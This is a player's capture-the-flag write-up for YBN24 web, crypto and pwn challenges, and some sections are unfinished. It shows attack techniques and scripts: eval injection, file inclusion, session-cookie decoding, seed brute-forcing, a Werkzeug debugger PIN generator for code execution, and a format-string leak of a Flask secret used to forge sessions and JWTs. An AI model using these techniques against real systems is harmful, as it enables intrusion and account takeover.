We managed to get 14th place out of 123 with 21632 points but sadly did not qualify. Challenges roughly ordered by how hard I felt they were.
Solves:  Hero 1(crypto?), Inspector Who(web), Don't Look At Me!!!(web), Web web web(web), Simple website(web), Stationary threat(web), Number oracle(web), MORE KABOOMMMMM(web), cool math games(crypto), Memory sim(pwn), View source revenge(web), NoButYes(web), Needle in a haystack(pwn)
## Hero 1
This wasn't really a cryto challenge.
```python
from Crypto.Util.number import getPrime, bytes_to_long

flag = b"YBN24{????????????????????????}"

p = getPrime(256)
q = getPrime(256)
y = getPrime(256)
e = getPrime(64)
c = getPrime(32)


try:
    a = int(eval(input("a: ")))
    b = int(eval(input("b: ")))

    assert a > 0
except:
    quit()


g = q * e
n = ((a) ** (b + c)) * p * q * y

enc = pow(bytes_to_long(flag), e, n)

ct = enc * y

print("g = {}".format(g))
print("n = {}".format(n))
print("ct = {}".format(ct))
```
For some reason, the inputs a and b are directly evaluated, so we can simple submit `print(flag)` as the input and we will get the flag.
`YBN24{RS4_mu1t!prim3_f4ct0r1ng}`
## Inspector who
"Hey I came across this website displaying a 3D model of the TARDIS! I wonder what I can find from INSPECTING this site..."
By using the power of inspect element, we find the flag
![[Pasted image 20241201110933.png]]
`YBN24{1_l0v3_1n5p3ct_3l3m3nt}`
## Don't look at me!
Once again with the power of inspect element, we see that a script `decrypt.js` is being loaded
![[Pasted image 20241201111141.png]]It seems the script is obfuscated so we throw it into a js deobfuscator.
```js
function _0x3ca409(_0x50cea5, _0x1e126b) {
  let _0xdce022 = '';
  for (let _0x2eb5b4 = 0; _0x2eb5b4 < _0x50cea5.length; _0x2eb5b4++) {
    let _0x128b0a = _0x50cea5.charCodeAt(_0x2eb5b4) ^ _0x1e126b.charCodeAt(_0x2eb5b4 % _0x1e126b.length);
    _0x128b0a = _0x128b0a ^ 7;
    _0xdce022 += String.fromCharCode(_0x128b0a);
  }
  return _0xdce022;
}
async function _0x1dc557() {
  const _0x5f3d96 = await fetch("encryptedFlag.txt");
  return await _0x5f3d96.text();
}
async function _0x2c43cf() {
  const _0x1d2082 = await _0x1dc557();
  const _0x3b9633 = _0x3ca409(_0x1d2082, 'IAMINSOMUCHPAIN');
  const _0x3196bc = document.getElementById("secret");
  _0x3196bc.innerHTML = _0x3b9633;
  window._0x5cd0b7 = () => {};
}
```
The function `_0x2c43cf()` seems to be responsible for giving us the flag, load the deobfuscated script into the js console and call `_0x2c43cf()`, giving us the flag
![[Pasted image 20241201111523.png]]
`YBN24{I_To1d_y0u_not_T0_Peek!}`
## Web web web
Once again through inspect element, we are able to find parts of the flag. This time, the flag seemed to be split up across different files
![[Pasted image 20241201112322.png]]
![[Pasted image 20241201112341.png]]
![[Pasted image 20241201112428.png]]
The last part was slightly trickier. After quite some time searching, I still could not find it and decided to load burp to assist in searching for it.
![[Pasted image 20241202195015.png]]
From burp, only 3 requests contained the phrase `part`, meaning the last part of the flag was not from the same page.  I decided to poke around at other common endpoints such as `/sitemap.xml` and `robots.txt`, ultimately finding the flag from `robots.txt`
![[Pasted image 20241202195217.png]]
![[Pasted image 20241202195228.png]]
`YBN24{th1s_1s_4_c4ll_f0r_h3lp}`
## Simple website
For this challenge, the site seems to display whatever file it finds from the `?page=...` query parameter.
![[Pasted image 20241202195414.png]]
As such, this is a LFI challenge and I started poking around for possible locations the flag might be. 
![[Pasted image 20241202195617.png]]After trying various paths, I found the flag in `/flag.txt`
![[Pasted image 20241202195533.png]]
`YBN24{lfi_vuln3rable}`
>  I didn't know text files could be directly included but it do be like that I guess
## Stationary threat
Source code is provided for this challenge. The important parts are
```python
roles = ['user', 'student','admin', 'teacher']
...
@app.route('/api/users/<_id>/roles', methods=['POST'])  
def create_role(_id):  
    # Our State of the Art Authentication System  
    if 1==1:  
        _id = int(_id)  
        if _id < 0 or _id > len(roles):  
            return jsonify({'message': 'Invalid id'}), 400  
        session['role'] = roles[_id]  
        return jsonify({'message': 'Role created successfully'})  
    else:  
        return jsonify({'message': 'Unauthorized'}), 401  
    @app.route('/nuke')  
def nuke():  
    role = session.get('role',"user")  
    if role == 'admin':  
        flag = open('flag.txt','r').read()  
    else:  
        flag = None   
return render_template('nuke.html', flag=flag)
```
* The `/nuke` endpoint, which requires us to have the `admin` role retrieved from the session storage.
* The  `/api/users/<_id>/roles` endpoint, which has no authentication and allows us to submit any role id and have it stored in the session storage. 
Thus, a simple post request of `https://stationary-threat-stationary-threat-chall.ybn.sg/api/users/2/roles` allows us to obtain the admin role, then `/nuke`
`YBN24{@utHEnT!cA71On?_wha7'S_7h4t?}`
## Number oracle
A site where we have to consecutively guess the correct numbers. No source code is provided
![[Pasted image 20241202201153.png]]
Since no source code was provided, I started poking around the page
![[Pasted image 20241202201333.png]]
We can see that there is no script client side and that verification is done by the server.
![[Pasted image 20241202201508.png]]
There is also a session cookie, which when [decoded](https://www.kirsle.net/wizards/flask-session.cgi) reveals the next number is actually kept in session storage (which when using flask sessions is viewable, but not editable without the secret key).
![[Pasted image 20241202201702.png]]
Thus, by retrieving the session cookie and decoding it each guess, we can correctly submit the next number. I was lazy to do it by hand 10 times so I made a quick script
```python
import requests, base64, json  
  
endpoint = "https://number-oracle-number-oracle-chall.ybn.sg/" 
session = requests.Session()  
  
r = None  
def make_req(num=0):  
    try:  
        global r  
        data = {"guess": num}  
        r = session.post(endpoint, data=data)  
        cookies = session.cookies.get("session")  
        print(cookies)  
        cookies = cookies.split(".")[0]  
        # Add padding if necessary  
        padding_needed = len(cookies) % 4  
        if padding_needed:  
            cookies += '=' * (4 - padding_needed)  
        s = base64.b64decode(cookies).decode()  
        num = json.loads(s)["next_guess"]  
        print(num)  
        return num  
    except Exception as e:  
        print(r.text)  
        print(session.cookies)  
        raise e  
  
num = 0  
i = 0  
while True:  
    i+= 1  
    num = make_req(num)  
    print("Occ:", i)  
    if (i > 10):  
        break  
  
print(r.text)  
print(session.cookies)
```
`YBN24{D0nT_pUT_$3CR3Ts_IN_53S$1ON_coOk1Es_a2650f92c6893e5bb6437}`
## MORE KABOOMMMMM
Source code is provided for this challenge.
![[Pasted image 20241202202146.png]]
```js
...
router.post('/nuke', (req, res) => {  
    // Call the backend script with the provided data  
    const data = req.body;  
    if (!data.baba || !data.nukes) {  
        res.status(400).json({ error: 'Invalid data' });  
        return  
    }  
    if (data.baba.length !== 2 || data.nukes.some(nuke => nuke.length !== 2)) {  
        res.status(400).json({ error: 'Invalid data' });  
        return  
    }  
  
  
    const {baba,nukes} = data;  
    baba[0] = Number(baba[0])  
    baba[1] = Number(baba[1])  
    if (baba[0] < 0 || baba[0] > 20 || baba[1] < 0 || baba[1] > 20){  
        res.status(400).json({ error: 'Data Out Of Range' });  
        return  
    }  
    // add an extra nuke at baba's exact position  
    nukes.push(baba)  
    var number_of_nukes_hit = 0  
  
    for (let nuke of nukes){  
        let [x,y] = nuke;  
        x = parseInt(x)  
        y = parseInt(y)  
        if (x < 0 || x > 20 || y < 0 || y > 20){  
            res.status(400).json({ error: 'Data Out Of Range' });  
            return  
        }  
        if (Math.abs(baba[0]-x) <= 5 && Math.abs(baba[1]-y) <= 5){  
            number_of_nukes_hit += 1  
        }  
    }  
    if (number_of_nukes_hit >= 1){  
        res.status(200).json({result: `Good Job Comarade. Baba has been successfully nuked! He has suffered a total of ${number_of_nukes_hit} damage.`});  
    }  
    else {  
        res.status(200).json({result: `Baba is safe. You have failed the motherland. ${flag} `});  
    }  
});
```
Our goal for this challenge is to *not* get Baba nuked, despite there always being a free nuke added at Baba's position. The vulnerability comes from this line
```js
    baba[0] = Number(baba[0])  
    baba[1] = Number(baba[1])  
```
, which directly throws the text we provide into a `Number` constructor. As per the [mdn docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number#:~:text=returns%20NaN), a number that can't be parsed will return `NaN`, which could be used to bypass checks. In this case, `Nan > ...` and `Nan < ...` both return false, thus the position is considered within range and the baba position check succeeds. `Math.abs(baba[0]-x)` will still return `NaN`, which also causes the range checks to fail and no nukes are counted. 
![[Pasted image 20241202203101.png]]
`YBN24{I_10VE_J4vaScR1P7}`
## Cool math games
Source code is provided. Similar to number oracle, we are supposed to guess the next number except this time without the server providing it.
main.py:
```python
RAND_SEED = os.getenv("seed")  
random.seed(int(RAND_SEED))  
  
def generate_random_string():  
    return "".join([random.choice(ascii_lowercase + ascii_uppercase + digits) for _ in range(32)])  
  
rounds = 160  
print(f"Welcome to my game! Your user ID is \"{generate_random_string()}\"")  
print("Complete all the rounds of this game, and you win the flag! Good luck!")  
for i in range(rounds):  
    print('*'*8, f"Round {i+1}", '*'*8)  
    answer_string = generate_random_string()  
    guess = str(input("Enter the string: "))  
    if guess != answer_string:  
        print("Sorry, but your response was wrong. Out!")  
        exit()  
    print()  
    print(f"Congratulations! Here is your flag: {os.getenv('FLAG')}")
```
startup.sh:
```bash
#!/bin/bash  
  
sudo apt install socat -y  
sudo apt install python3 -y  
  
seed=$RANDOM  
export seed # Credits to Jabriel for the idea  
export FLAG="YBN24{this_is_a_fake_flag}"  
  
pip install -r requirements.txt  
socat -dd TCP-LISTEN:1337,fork,reuseaddr EXEC:"python server.py"
```
From the startup script, we can see that the seed is set before the servers run, meaning that the seed is fixed across connections.  Checking what `$RANDOM` is, we find it is a random number between [0 and 32767](https://stackoverflow.com/a/1194890). When we first connect, we are given a random user id based on the seed, meaning we can brute force all 32768 seeds until one correctly generates the same user id.
```python
for i in range(32768):  
    random.seed(i)  
    if generate_random_string() == "QfcBV6xiFUrhKL92jxRDP8zudB7XnBcg":  # Our user id
        print(i)
```
From there, we can seed our generator to match the rng used by the server, giving us the exact same randomness as generated by the server.
```python
p = remote("tcp.ybn.sg", 28480)  
id = p.recvline()  
if "QfcBV6xiFUrhKL92jxRDP8zudB7XnBcg" not in id:  
    print("Wrong remote")  
    exit()  
p.recvline()  
p.recvline()  
  
random.seed(7631)  
generate_random_string()  # COmpensate for the 1 user id generated
for i in range(160):  
    p.sendline(generate_random_string())  
    print(p.recvline())  
print(p.recvline())
```
`YBN24{wH0_kN0w5_8a5H_R4nD0m_w4sn7_s0_rAnD0m_4ft3r_4ll}`
> The seed can actually be found within the same connection to the server, thus we can both find the seed and then immediately start submitting guesses
## Memory sim
TODO: (1 a 898),(1 d 897),(2 897)
`YBN24{n3g4tive_inDexeS_aNd_struCt_ov3rfl0W!}`
## View source revenge
A site that allows us to view the contents of any file
![[Pasted image 20241202212041.png]]
I first tried viewing `flag.txt`, which returned an empty page
![[Pasted image 20241202212206.png]]
Trying `/flag.txt`, we instead get an error, suggesting the flag was probably censored. Next, I tried the common file names `app.py` and `Dockerfile` and managed to retrieve their content
```python
# Run by Docker
# This file is included to reduce the guessiness of this challenge. 
# The file run is main.py, which is the identical as the file here.

from flask import Flask, request, render_template , redirect, url_for,render_template_string
import os 
app = Flask(__name__)
FLAG = open('flag.txt').read()

@app.route('/')
def index():
    return render_template('index.html')
    
@app.route('/view', methods = ["GET"])
def view():
    file_name = request.args.get('file_name')
    if not file_name:
        return redirect(url_for('index'))
    
    file_path = os.path.join(os.getcwd(), file_name)
    
    if not os.path.exists(file_path):
        return render_template('error.html')
    
    with open(file_path, "r") as f:
        content = f.read()
    
    content = content.replace(FLAG, "")

    return render_template("display.html",content = content,file_name = file_name)

if __name__ == '__main__':
    app.run(debug = True)
```
It is indeed shown that the flag is censored
```Dockerfile
# Use an official Python runtime as a parent image
FROM python:3.11-slim
# Set the working directory in the container
WORKDIR /usr/src/app
# Copy the requirements file into the container
COPY requirements.txt ./
# Install any necessary dependencies
RUN pip install --no-cache-dir -r requirements.txt
# Create a new user and group with a secure name
RUN useradd -m very_secure_username
# Change ownership of the working directory to the newly created user
RUN chown -R very_secure_username:very_secure_username /usr/src/app
# Switch to the new user
USER very_secure_username
# Copy the application code into the container
COPY . /usr/src/app
# Set environment variables
ENV FLASK_APP=app.py
ENV FLASK_ENV=development
ENV FLASK_DEBUG=1
# Expose the port the app runs on
EXPOSE 5000
# Command to run the application
CMD ["flask", "run", "--host=0.0.0.0"]
```
From the dockerfile, we see that `FLASK_DEBUG` is enabled, meaning the `/console` endpoint is exposed. Given both LFI and debug mode, we are able to generate the [debugger pin](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) and gain RCE. I had also tried to automatically leak the pin using https://github.com/Ruulian/wconsole_extractor but did not succeed(Perhaps my extractor code was broken).
After gaining all the information required, we can generate  our debug pin
```python
import hashlib  
from itertools import chain  
probably_public_bits = [  
    'very_secure_username',  # username  
    'flask.app',  # modname  
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))  
    '/usr/local/lib/python3.11/site-packages/flask/app.py'  # getattr(mod, '__file__', None),  
]  
  
private_bits = [  
    str(0x921784229705),  # str(uuid.getnode()),  /sys/class/net/ens33/address  
    '90eca5f1-105b-434e-ad02-135111eb1526'  # get_machine_id(), /etc/machine-id  
]  
  
# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0  
h = hashlib.sha1()  
for bit in chain(probably_public_bits, private_bits):  
    if not bit:  
        continue  
    if isinstance(bit, str):  
        bit = bit.encode('utf-8')  
    h.update(bit)  
h.update(b'cookiesalt')  
# h.update(b'shittysalt')  
  
cookie_name = '__wzd' + h.hexdigest()[:20]  
  
num = None  
if num is None:  
    h.update(b'pinsalt')  
    num = ('%09d' % int(h.hexdigest(), 16))[:9]  
  
rv = None  
if rv is None:  
    for group_size in 5, 4, 3:  
        if len(num) % group_size == 0:  
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')  
                          for x in range(0, len(num), group_size))  
            break  
    else:  
        rv = num  
  
print(rv) # >> 889-177-408
```
![[Pasted image 20241202214006.png]]
`YBN24{F1@sK_DEBUg_CH4L1?_1AM3}`
## NoButYes
We are given source code for this challenge. The target of this challenge is the `/admin` endpoint, where our jwt token needs to identify we have admin
```python
def get_secret(uuid):  
    db = sqlite3.connect('secrets.db')  
    db.row_factory = lambda cursor, row: row[0]  
    cursor = db.cursor()  
    sql = "SELECT secret FROM secrets WHERE uuid = ?"  
    cursor.execute(sql, (uuid,))  
    secret = str(cursor.fetchone())  
    db.close()  
    return secret

@app.route('/admin', methods=['GET'])  
def admin():  
    print(request.cookies,session)  
    if request.cookies.get('token') is None or session.get('uuid') is None:  
        return jsonify({"response": "Unauthorized", "status": 401})  
    token = request.cookies.get('token')  
    uuid = session['uuid']  
    secrets = get_secret(session['uuid'])  
    # TODO: Make somehow sign token with own/known secret?  
    try:  
        decoded = jwt.decode(token, secrets, algorithms=["HS256"])  
    except jwt.ExpiredSignatureError:  
        return jsonify({"response": "Token Expired", "status": 401})  
    except jwt.InvalidTokenError:  
        return jsonify({"response": "Invalid Token", "status": 401})  
    if decoded['admin']:  
        return jsonify({"response": f"Welcome Admin. Here's the Flag: {os.getenv('FLAG','TESTFLAG{}')}", "status": 200})  
    else:  
        return jsonify({"response": "Only admin's can access this page!", "status": 401})
```
Further reviewing the source code, we also see the `/api` endpoint, which TODO finish sentence
```python
def save_token(uuid, secret):  
    db = sqlite3.connect('secrets.db')  
    cursor = db.cursor()  
    sql = "INSERT OR IGNORE INTO secrets (uuid, secret) VALUES (?, ?)"  
    cursor.execute(sql, (uuid, secret))  
    sql = "UPDATE secrets SET secret = ? WHERE uuid = ?"  
    cursor.execute(sql, (secret, uuid))  
    db.commit()  
    db.close()

def generate_jwt_token():  
    user_info = {  
        "admin":False  
    }  
    secret = os.urandom(32)  
    secret = secret.hex()  
    token = jwt.encode(user_info,secret,"HS256")  
    return [token,secret]

@app.route('/api', methods=['POST'])  
def api():  
    session.setdefault('uuid', str(uuid.uuid4()))  
    data = request.get_json()  
    command = data.get('command')  
    # take everything before the first space and lowercase it  
    prefix = command.split(" ")[0].lower()  
  
    if prefix not in command_responses:  
        return jsonify({"response": "Invalid Command", "status": 400})  
    response = generate_response(command_responses[prefix], command)  
  
    jwt_token, secret = generate_jwt_token()  
    save_token(session['uuid'], secret)  
  
    response = make_response(jsonify({"response": response, "status": 200}))  
    response.set_cookie('token', jwt_token)  
    return response
```
From this code, it should be noted that each user has their jwt token signed with an individual secret that is not shared. The `generate_response()` function is also rather suspicious
```python
class RandomResponse:  
    def __init__(self, response: str):  
        self.response = response  
        self.reroll()  
  
    def reroll(self):  
        rand_gen = random.randint(1,10)  
        self.generated = self.response*rand_gen  
  
def generate_response(response, command):  
    responseObj = RandomResponse(response)  
    message = "{response.generated} but "+command+"."  
    return message.format(response = responseObj)
```
For some reason, there is an entire class simply to generate a random message that is repeated a random number of times. Additionally, the `message.format` function seems to be able to access attributes of `RandomResponse`, as from `{response.generated}`. Googling, I found this interesting post on reddit: https://www.reddit.com/r/Python/comments/5kzhnn/be_careful_with_pythons_newstyle_string_format/. Using their payload as a POC, we can get this
![[Pasted image 20241202223217.png]]
Using that, we are able to extract the flask secret key.
![[Pasted image 20241202215754.png]]
Using the key, we are able to forge our own session tokens, controlling `uuid`. What can we do with a custom uuid? Remember that our goal is to be able to modify the jwt token to give ourselves admin, so we need a way to sign our own jwt tokens. If we revisit `get_secret()`, one line stands out.
```python
def get_secret(uuid):
	db = sqlite3.connect('secrets.db')  
	db.row_factory = lambda cursor, row: row[0]  
	cursor = db.cursor()
	sql = "SELECT secret FROM secrets WHERE uuid = ?"  
	cursor.execute(sql, (uuid,))
	secret = str(cursor.fetchone()) # <--
	...
```
Here, the result from the query is being cast to a string. This is usually not required, as a row should be returned as a string anyways. However, if the uuid queried were to not exist, the returned `None` would be cast into a string `"None"`, thus returning the secret as `"None"`. By forging a session  token with a non-existent uuid, we are able to sign jwt tokens with `"None"`.
![[Pasted image 20241202215911.png]]
The final step is to access `/admin`, giving us the flag
![[Pasted image 20241202220039.png]]

`YBN24{8@ba_!S_A_B@d_PRo6rAmm3R}`
## Needle in a haystack
TODO
`YBN24{FL4G_1N_4_ST4CK_XDDDDDD}`